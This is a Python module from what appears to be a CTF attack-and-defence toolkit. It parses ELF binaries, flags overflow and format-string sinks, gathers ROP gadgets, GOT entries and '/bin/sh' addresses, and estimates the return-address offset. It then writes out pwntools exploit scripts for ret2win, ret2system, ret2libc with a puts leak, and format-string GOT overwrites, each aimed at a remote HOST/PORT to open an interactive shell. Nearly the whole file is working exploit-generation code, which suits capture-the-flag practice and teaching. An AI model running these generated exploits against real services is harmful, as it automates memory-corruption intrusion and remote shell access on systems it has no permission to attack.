"""Pwn Solver: static, deterministic analysis that names the vulnerability,
collects everything an exploit needs (win/system/"/bin/sh" addresses, GOT, ROP
gadgets), estimates the overflow offset from disassembly, and generates a
tailored pwntools script. No AI. The binary is parsed and disassembled, never
executed. The exact offset is best confirmed by running the generated finder on
your own box (Kali), which the script includes.
"""
from __future__ import annotations

import io
import re
import shutil
import subprocess

from .elf import ELF, checksec

try:
    from elftools.elf.elffile import ELFFile
    from elftools.elf.relocation import RelocationSection
    from elftools.elf.sections import SymbolTableSection
    _HAVE_ELFTOOLS = True
except Exception:  # pragma: no cover - optional dependency
    _HAVE_ELFTOOLS = False

try:
    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
    _HAVE_CAPSTONE = True
except Exception:  # pragma: no cover - optional dependency
    _HAVE_CAPSTONE = False

# Functions that write attacker input into a buffer (overflow sources).
OVERFLOW_FUNCS = {"gets", "fgets", "read", "scanf", "__isoc99_scanf", "sscanf",
                  "__isoc99_sscanf", "strcpy", "strncpy", "stpcpy", "strcat",
                  "sprintf", "vsprintf", "memcpy", "recv", "fread"}
# The classic "no bound at all" sinks: strongest overflow signal.
UNBOUNDED_FUNCS = {"gets", "scanf", "__isoc99_scanf", "strcpy", "strcat", "sprintf"}
FORMAT_FUNCS = {"printf", "fprintf", "sprintf", "snprintf", "vprintf", "dprintf", "vsnprintf"}
SHELL_FUNCS = {"system", "execve", "execl", "execlp", "execvp", "posix_spawn", "syscall"}
WIN_RE = re.compile(r"(^win$|^win_|_win$|back_?door|give_?shell|get_?shell|spawn_?shell|"
                    r"get_?flag|print_?flag|read_?flag|cat_?flag|secret|magic|backdoor|"
                    r"\bshell\b|\bflag\b)", re.I)


def _facts(data: bytes) -> dict:
    """Symbols (name->addr), imported funcs, GOT, '/bin/sh' address, stripped flag."""
    f: dict = {"symbols": {}, "imports": [], "got": {}, "binsh": None, "stripped": True}
    if _HAVE_ELFTOOLS:
        try:
            elf = ELFFile(io.BytesIO(data))
            for secname in (".symtab", ".dynsym"):
                sec = elf.get_section_by_name(secname)
                if isinstance(sec, SymbolTableSection):
                    if secname == ".symtab":
                        f["stripped"] = False
                    for sym in sec.iter_symbols():
                        t = sym["st_info"]["type"]
                        if sym.name and sym["st_value"] and t in ("STT_FUNC", "STT_OBJECT", "STT_NOTYPE"):
                            f["symbols"].setdefault(sym.name, sym["st_value"])
                        if (sym.name and t == "STT_FUNC" and sym["st_shndx"] == "SHN_UNDEF"):
                            f["imports"].append(sym.name)
            f["got"] = _got(elf)
            f["binsh"] = _search_binsh(elf, data)
            f["imports"] = sorted(set(f["imports"]))
            return f
        except Exception:
            pass
    # Fallback: pure-Python mini parser (names only, no addresses).
    try:
        e = ELF(data)
        f["imports"] = sorted(set(e.dynamic_symbols()))
        f["binsh"] = _search_binsh_mini(e, data)
    except Exception:
        pass
    return f


def _got(elf) -> dict:
    out: dict = {}
    for relname in (".rela.plt", ".rel.plt", ".rela.dyn", ".rel.dyn"):
        rel = elf.get_section_by_name(relname)
        if not isinstance(rel, RelocationSection):
            continue
        symtab = elf.get_section(rel["sh_link"])
        if not isinstance(symtab, SymbolTableSection):
            continue
        for r in rel.iter_relocations():
            try:
                name = symtab.get_symbol(r["r_info_sym"]).name
            except Exception:
                name = ""
            if name:
                out[name] = r["r_offset"]
    return out


def _search_binsh(elf, data: bytes) -> int | None:
    for sec in elf.iter_sections():
        try:
            if not (sec["sh_flags"] & 0x2):  # SHF_ALLOC
                continue
            body = sec.data()
        except Exception:
            continue
        idx = body.find(b"/bin/sh")
        if idx != -1:
            return sec["sh_addr"] + idx
    return None


def _search_binsh_mini(e: "ELF", data: bytes) -> int | None:
    idx = data.find(b"/bin/sh")
    if idx == -1:
        return None
    for p in e.phdrs:
        if p["offset"] <= idx < p["offset"] + p["filesz"]:
            return p["vaddr"] + (idx - p["offset"])
    return None


def _estimate_offset(data: bytes, cs: dict, facts: dict) -> dict:
    """Best-effort static overflow offset for the common 64-bit single-buffer case.

    Disassembles the function that calls an unbounded input sink, tracks the most
    recent `lea <argreg>, [rbp - X]` feeding the buffer argument, and returns
    X + 8 (saved rbp to saved return address). Heuristic: always confirm by
    running the generated finder.
    """
    out = {"value": None, "how": "not estimated", "confident": False}
    if not (_HAVE_CAPSTONE and _HAVE_ELFTOOLS) or cs.get("bits") != 64:
        out["how"] = "needs symbols + 64-bit; confirm by running the cyclic finder"
        return out
    try:
        elf = ELFFile(io.BytesIO(data))
        text = elf.get_section_by_name(".text")
        if not text:
            return out
        text_addr = text["sh_addr"]
        text_data = text.data()
        # Disassemble .text once and, for each call that resolves (via the PLT
        # relocation map) to an overflow sink, take the nearest preceding
        # `lea <reg>, [rbp - X]` as the buffer. offset = X + saved rbp (8).
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        last_disp = None  # disp of the most recent `lea <reg>, [rbp - X]`
        best = None
        plt_map = _plt_targets(elf)
        for ins in md.disasm(text_data, text_addr):
            m = ins.mnemonic
            if m == "lea":
                mm = re.search(r"\[rbp - (0x[0-9a-fA-F]+)\]", ins.op_str)
                if mm:
                    last_disp = int(mm.group(1), 16)
            elif m == "call":
                name = plt_map.get(_call_target(ins))
                if name in OVERFLOW_FUNCS and last_disp:
                    best = (name, last_disp + 8)
                    break
        if best:
            buf = best[1] - 8
            out.update(value=best[1], how=f"buffer at [rbp-{hex(buf)}] passed to {best[0]}(); "
                       f"offset = buffer({hex(buf)}) + saved rbp(8) = {best[1]}", confident=True)
        else:
            out["how"] = "could not locate a single stack buffer statically; run the cyclic finder"
    except Exception:
        out["how"] = "disassembly failed; run the cyclic finder"
    return out


def _plt_targets(elf) -> dict:
    """Map each PLT stub entry address to its imported function name."""
    out: dict = {}
    plt = elf.get_section_by_name(".plt.sec") or elf.get_section_by_name(".plt")
    rel = elf.get_section_by_name(".rela.plt") or elf.get_section_by_name(".rel.plt")
    if not plt or not isinstance(rel, RelocationSection):
        return out
    symtab = elf.get_section(rel["sh_link"])
    names = []
    for r in rel.iter_relocations():
        try:
            names.append(symtab.get_symbol(r["r_info_sym"]).name)
        except Exception:
            names.append("")
    base = plt["sh_addr"]
    entsize = plt["sh_entsize"] or 16
    # .plt[0] is the resolver stub; entries 1.. map to relocations in order.
    skip = 0 if (elf.get_section_by_name(".plt.sec")) else 1
    for i, name in enumerate(names):
        out[base + (i + skip) * entsize] = name
    return out


def _call_target(ins) -> int | None:
    try:
        op = ins.op_str.strip()
        if op.startswith("0x"):
            return int(op, 16)
    except Exception:
        pass
    return None


def _gadgets(path: str | None, data: bytes) -> dict:
    """Curated ROP gadgets via ROPgadget if available, else byte-signature search."""
    wanted = {
        "pop rdi ; ret": "pop rdi; ret", "pop rsi ; ret": "pop rsi; ret",
        "pop rdx ; ret": "pop rdx; ret", "pop rax ; ret": "pop rax; ret",
        "pop rsi ; pop r15 ; ret": "pop rsi; pop r15; ret",
        "pop rdi ; pop rbp ; ret": "pop rdi; pop rbp; ret",
        "ret": "ret", "syscall ; ret": "syscall; ret", "syscall": "syscall",
        "leave ; ret": "leave; ret",
    }
    found: dict = {}
    if path and shutil.which("ROPgadget"):
        try:
            p = subprocess.run(["ROPgadget", "--binary", path], capture_output=True,
                               text=True, timeout=60)
            for line in p.stdout.splitlines():
                mm = re.match(r"(0x[0-9a-fA-F]+)\s*:\s*(.+)$", line.strip())
                if not mm:
                    continue
                addr, g = mm.group(1), mm.group(2).strip()
                if g in wanted and wanted[g] not in found:
                    found[wanted[g]] = addr
            if found:
                return {"source": "ROPgadget", "gadgets": found}
        except (OSError, subprocess.TimeoutExpired):
            pass
    # Fallback to the bundled byte-signature search.
    from .pwntools_utils import find_gadgets
    fg = find_gadgets(data)
    simple = {k: v[0] for k, v in fg.get("gadgets", {}).items() if v}
    return {"source": "byte-signature", "gadgets": simple}


def _classify(cs: dict, facts: dict) -> dict:
    imports = set(facts.get("imports", []))
    symbols = facts.get("symbols", {})
    overflow_sinks = sorted(imports & OVERFLOW_FUNCS)
    unbounded = sorted(imports & UNBOUNDED_FUNCS)
    shell = sorted(imports & SHELL_FUNCS)
    fmt = sorted(imports & FORMAT_FUNCS)
    win = sorted(n for n in symbols if WIN_RE.search(n) and n not in OVERFLOW_FUNCS)
    has_binsh = facts.get("binsh") is not None

    vuln, approach, conf, why = "Unclear", "manual-review", "low", []

    if overflow_sinks:
        vuln = "Stack buffer overflow"
        conf = "high" if unbounded else "medium"
        why.append(f"calls unbounded input function(s): {', '.join(unbounded or overflow_sinks)}")
        if not cs.get("canary"):
            why.append("no stack canary, so the saved return address is overwritable")
        else:
            why.append("stack canary present, so you likely need a leak or a canary bypass")
        if win:
            approach = "ret2win"
            why.append(f"a win-style function exists: {', '.join(win[:4])}")
        elif "system" in shell and has_binsh:
            approach = "ret2system"
            why.append("system() and a \"/bin/sh\" string are present")
        elif cs.get("nx"):
            approach = "ret2libc / ROP"
            why.append("NX is on, so return into libc or build a ROP chain (leak libc first)")
        else:
            approach = "shellcode or ROP"
            why.append("NX is off, so injected shellcode on the stack may be possible")
    elif fmt:
        vuln = "Possible format string"
        approach = "format-string leak/write"
        conf = "low"
        why.append(f"format function(s) imported: {', '.join(fmt)}; check for a call whose "
                   "format argument is user-controlled (for example printf(buf))")
    else:
        why.append("no classic overflow or format sink in the imports; review manually")

    return {"vuln": vuln, "approach": approach, "confidence": conf,
            "rationale": why, "overflow_sinks": overflow_sinks, "shell_funcs": shell,
            "format_funcs": fmt, "win_functions": win}


def _gen_script(filename: str, cs: dict, facts: dict, cls: dict,
                gadgets: dict, offset: dict, host: str = "", port: int = 0) -> str:
    arch = "amd64" if cs.get("bits") == 64 else "i386"
    off = offset.get("value")
    off_line = (f"offset = {off}  # static estimate; confirm with find_offset()" if off
                else "offset = 0  # run find_offset() below to get this")
    win = cls["win_functions"][0] if cls["win_functions"] else None
    g = gadgets.get("gadgets", {})
    conn = (f"    if args.REMOTE:\n        return remote('{host}', {port})\n" if host else
            "    if args.REMOTE:\n        return remote(HOST, PORT)\n")

    if cls["approach"] == "ret2win" and win:
        body = f"""    # ret2win: overwrite the saved return address with {win}
    ret = {g.get('ret', 'rop.find_gadget([\"ret\"])[0]  # alignment')}
    payload = flat({{ offset: [ret, exe.sym['{win}']] }})
    io.sendline(payload)
    io.interactive()"""
    elif cls["approach"] == "ret2system" and facts.get("binsh"):
        pr = g.get("pop rdi; ret")
        body = f"""    # ret2system: pop "/bin/sh" into rdi, align, call system
    binsh = {hex(facts['binsh'])}
    pop_rdi = {pr or 'rop.find_gadget([\"pop rdi\", \"ret\"])[0]'}
    ret = {g.get('ret', 'rop.find_gadget([\"ret\"])[0]')}
    payload = flat({{ offset: [pop_rdi, binsh, ret, exe.plt['system']] }})
    io.sendline(payload)
    io.interactive()"""
    elif cls["approach"].startswith("ret2libc"):
        body = """    # ret2libc: leak a libc address (puts@got via puts@plt), return to main,
    # resolve libc, then call system("/bin/sh").
    rop = ROP(exe)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    log.info('leaking libc via puts(puts@got)...')
    payload = flat({ offset: [pop_rdi, exe.got['puts'], exe.plt['puts'], exe.sym['main']] })
    io.sendline(payload)
    leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
    log.success(f'puts@libc = {hex(leak)}')
    # libc = ELF('./libc.so.6'); libc.address = leak - libc.sym['puts']
    # rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh')))
    # io.sendline(flat({ offset: [rop.find_gadget(['ret'])[0], rop2.chain()] }))
    io.interactive()"""
    elif cls["vuln"].startswith("Possible format"):
        body = """    # format string: find your parameter offset, then leak or write.
    # io.sendline(b'%p ' * 20)            # find where your input lands
    # payload = fmtstr_payload(OFFSET, {exe.got['printf']: exe.sym['win']})
    # io.sendline(payload)
    io.interactive()"""
    else:
        body = """    # manual: overwrite the return address with your target
    payload = flat({ offset: 0x0 })
    io.sendline(payload)
    io.interactive()"""

    return f'''#!/usr/bin/env python3
# Auto-generated by A&D Command Center Pwn Solver. Review before running.
# Vuln: {cls["vuln"]}  |  Approach: {cls["approach"]}  |  Confidence: {cls["confidence"]}
from pwn import *

exe = context.binary = ELF('./{filename}')
context.arch = '{arch}'

HOST, PORT = '{host or "CHANGE_ME"}', {port or 0}


def conn():
{conn}    return process(exe.path)


def find_offset():
    # Run locally to get the EXACT offset, then paste it above.
    io = process(exe.path)
    io.sendline(cyclic(400, n={8 if arch == "amd64" else 4}))
    io.wait()
    core = io.corefile
    fault = core.read(core.rsp, {8 if arch == "amd64" else 4})
    off = cyclic_find(fault, n={8 if arch == "amd64" else 4})
    log.success(f'offset = {{off}}')
    return off


def main():
    {off_line}
    io = conn()
    rop = ROP(exe)
{body}


if __name__ == '__main__':
    main()
'''


def solve(data: bytes, filename: str, path: str | None = None, host: str = "", port: int = 0) -> dict:
    cs = checksec(data)  # raises elf.NotELF for non-ELF; caller handles
    facts = _facts(data)
    gadgets = _gadgets(path, data)
    cls = _classify(cs, facts)
    offset = _estimate_offset(data, cs, facts)
    script = _gen_script(filename, cs, facts, cls, gadgets, offset, host, port)
    return {
        "checksec": cs,
        "vuln": cls["vuln"],
        "approach": cls["approach"],
        "confidence": cls["confidence"],
        "rationale": cls["rationale"],
        "overflow_sinks": cls["overflow_sinks"],
        "shell_funcs": cls["shell_funcs"],
        "format_funcs": cls["format_funcs"],
        "win_functions": cls["win_functions"],
        "binsh_addr": hex(facts["binsh"]) if facts.get("binsh") else None,
        "got": {k: hex(v) for k, v in list(facts.get("got", {}).items())[:40]},
        "gadgets": gadgets,
        "offset_estimate": offset,
        "stripped": facts.get("stripped", True),
        "engine": "pyelftools+capstone+ROPgadget" if _HAVE_ELFTOOLS else "builtin",
        "script": script,
        "disclaimer": "Static analysis. The binary was parsed and disassembled, never run. "
                      "The offset is an estimate; confirm it with find_offset() in the script "
                      "on an authorized box.",
    }
